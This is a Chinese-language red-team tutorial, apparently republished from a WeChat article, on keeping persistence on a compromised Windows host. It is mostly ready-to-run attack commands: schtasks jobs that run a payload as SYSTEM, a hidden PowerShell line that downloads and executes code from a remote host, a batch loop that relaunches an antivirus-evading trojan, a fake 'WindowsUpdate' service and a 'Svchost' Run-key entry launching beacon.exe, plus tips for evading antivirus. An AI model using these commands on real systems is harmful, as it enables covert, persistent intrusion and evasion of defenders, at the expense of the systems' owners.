> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/GCEPiILUNY_TFIrzd8QwMQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEI4HYp8DyWfibI2LxfzKEibbYekd7pnnMLzN2QPJ9QVoXROLVoLyicXOMhQ/640)

Windows 权限维持

**目录**

定时任务

创建隐蔽账号

进程迁移

启动目录

注册服务自启 (报毒)

修改注册表实现自启动

在红蓝对抗实战中，当我们获取到一台 Windows 主机的权限后，首先要做的就是怎么维持住该权限。因为防守方的实力也在不断增强，并且他们的流量监测设备也在不断监控，如果发现机器被植入木马，他们肯定会采取措施。

比如采取以下几点措施：

查杀木马进程

重启主机

断网

关闭主机

而对于我们维持权限，可以有以下几点：

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640)

定时任务

使用 schtasks 命令创建定时任务

在目标主机上创建一个名为 test 的计划任务，启动程序为 C:\vps.exe，启动权限为 system，启动时间为每隔一小时启动一次。当执行完该命令，该计划任务就已经启动了

schtasks /create /tn test /sc HOURLY /mo 1 /tr c:\vps.exe /ru system /f

其他启动时间参数：

/sc onlogon  用户登录时启动

/sc onstart  系统启动时启动

/sc onidle   系统空闲时启动

但是如果是 powershell 命令的话，执行完下面的命令，还需要执行启动该计划任务的命令

schtasks /create /tn test /sc HOURLY /mo 1 /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c'IEX ((new-object net.webclient).downloadstring(''http://xx.xx.xx.xx'''))'" /ru system /f

查询该 test 计划任务

schtasks /query | findstr test

启动该 test 计划任务

schtasks /run /i /tn "test"

删除该 test 计划任务

schtasks /delete /tn "test" /f

如果当期用户权限是普通权限那么 /ru 参数为 %USERNAME%。

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEICe2F45AMBdYvHqGpdLnD8oRHuYRFlbrnxz36cBB6FwsFLwISL68dGg/640)

如果是管理员权限，可以指定为 system。

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIvXJMDUMY543DAhLMBb8sHvBTSbPyic9bAWSTvHxtj45QY9IoJcq8uHg/640)

但是如果目标主机有杀软的话会报毒

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIpuBGhnFRbCvxFnIo1J2Cy9GficX7pmRSulRf1ibAlRRI9gOqG9g9nJbQ/640)

所以，要想绕过杀入软件创建计划任务的话，有这么一个思路。利用 VBS 脚本创建计划任务，然后执行该 VBS 脚本即可。实测不报毒。

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIEQBbT69Hof9VfLeiae7NGa5Fb5YtpfqRegkRYSPWJqy3WH2efpDoxLg/640)

传送门： Windows 中的计划任务 (schtasks)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640)

创建隐蔽账号

如果目标主机的 3389 端口开放着，则我们可以创建隐蔽账号。

或者读取该主机 administrator 账号密码，使用 impacket 工具包登录 (需要目标主机开启 445 端口)。

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIFFlbQuZowPwqPzzT2r4ysiab1ohPpOInibjlP9Toz5GhsQYqib5U7MLuA/640)

注意，如果目标主机上有杀软的话，创建新用户杀软会有安全提示的。

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIxRYoohuGJPu0QPVmGKRqRZ0tw4TJHIhicK7XO8RE9acyM9MY54e2lfg/640)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640)

进程迁移

针对查杀木马进程这个措施，我们可以将木马进程迁移到系统正常的进程当中

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIxPzNZfZAibVvNwtZO1plbMTziaibsMtzyXkaicIt3IL09CicGtIwINaF1lQ/640)

对于查杀木马进程，我们还有一种解决办法，设置 CMD 定时脚本，创建隐蔽账号，登录创建的账号执行该脚本：

这个 bat 脚本的代码如下。我们将免杀马放在 c:\windows\temp 目录下，免杀马的名字改为 run.exe

 @echo off  

 set INTERVAL=120

 :Again  

 echo start server

 C:

 cd C:\windows\temp

 start run.exe

 timeout %INTERVAL%

 goto Again

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIia9ibUicWNZJXEzw7E8rJTgRNSdh3WWicCIlgicaqUd52UhKlD9VUmpqichg/640)

然后运行这个脚本，这个脚本会每隔 2 分钟 (120 秒) 执行免杀木马。

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIsibkdoII09Lib9Yz6lrBl4JHBLiarG7fLc8IPtDnqw7oHAHnf1vNiboBBw/640)

在实战中我们的利用思路是，在目标机器上创建新用户，然后在新用户下执行该 bat 脚本。实战中我们可以将 120 秒的时间适当延长，免杀马的名字也可以修改为更具有迷惑性的名字。这样，如果防守方只是杀掉了免杀马的进程，而没有杀掉我们的这个 bat 脚本的 cmd.exe 进程的话，我们的这个 bat 脚本还会定时执行免杀马的。

注意：执行该脚本需要远程桌面双击执行，不能直接在 CobaltStrike 中使用命令行执行

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEInGAFWT2bFSaMdl3bXubibs2rFu4Odia5m32iaWZPVgyJ1XgeaqKymErEA/640)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640)

启动目录

针对重启主机，我们可以将木马放入系统的启动目录当中

C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIv7dF5s2HGXASDaKOWHa17HpibsGvg2iaakMZIic7mvd3w4M2siaNZaZJPw/640)

注意，如果目标主机上有杀软的话，将木马放入启动目录杀软会有安全提示的。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIulrlpia2xgoXtzktmdMpw8ib0C1BviapjyQDOuUgoH5cTYLv2LhYvqY8w/640)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640)

注册服务自启 (报毒)

注册服务

sc create "WindowsUpdate" binpath= "cmd /c start"C:\Users\Administrator\Desktop\beacon.exe""&&sc config"WindowsUpdate" start= auto&&net start  WindowsUpdate

查询服务

sc query WindowsUpdate

删除服务

sc delete WindowsUpdate

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIMBhHSr1dmzBq1eflaILWgoZshrHxwhI1ePxgcys9FujWpRKoMQibxxQ/640)

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIHIu09FsQ9uMaIGPNWZGOmqyjcb5oCpyJoeb2jGX0ULaQeKDvnNq1SQ/640)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640)

修改注册表实现自启动

  

命令行操作

添加注册表启动项

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Svchost /t REG_SZ /d "C:\windows\temp\test\beacon.exe" /f 

查询注册表启动项

reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v Svchost

删除注册表启动项

reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v Svchost /f

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIjddeZBS3MbUGKbADcfh8OXew6A2y4ZbZRlYevuzJ02HrrJiatB8t6Pg/640)

  

图形化操作

打开注册表 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIo8Y47Nmv99iafBXZc1LSInjY2q1vK4ceABiaOj4FARL8RusynVXdLsKg/640)

右键  新建 (N) ——> 字符串值 (S)

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEI5Z8V9044PibGer39H4xUwq6Vsj6ytlZ7eiavHy5kIM058A6cnH0r3ULQ/640)

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIFhoFoXCbKzt3dPsYvV5ljL5ibue7GTeVtxWIeVOp5wAL4brwHlQmrqA/640)

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIJicU36BcZQtbMHJEUqHlaibl6VxZVznlbM4J1NM4PWGl42lQUMOtYRkg/640)

目标计算机重新启动后，我们即可以收到弹回来的 shell

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIJAE6t11B5n4zpup4s8LjM59rM9Sbb9Sib1LFbPOQ2IcMwXvKjj2BPLg/640)

本文中的相关功能我已经集成在 CS 插件中，链接：https://t.zsxq.com/7MnIAM7

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIxjnibNic9oymwuj1H8x1vtqfoLO5x3blnribkO4oPahPm6OoWeNjIbXuQ/640)

相关文章：[使用 reg 管理注册表](http://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247488290&idx=1&sn=a2c90007bd57eb782a9837af60c204c0&chksm=eaad931fddda1a092ab5ce7445a11c1c55e0f50c7eb45ef2398b1bc60b6d6663a30a9e6f91be&scene=21#wechat_redirect)

**END**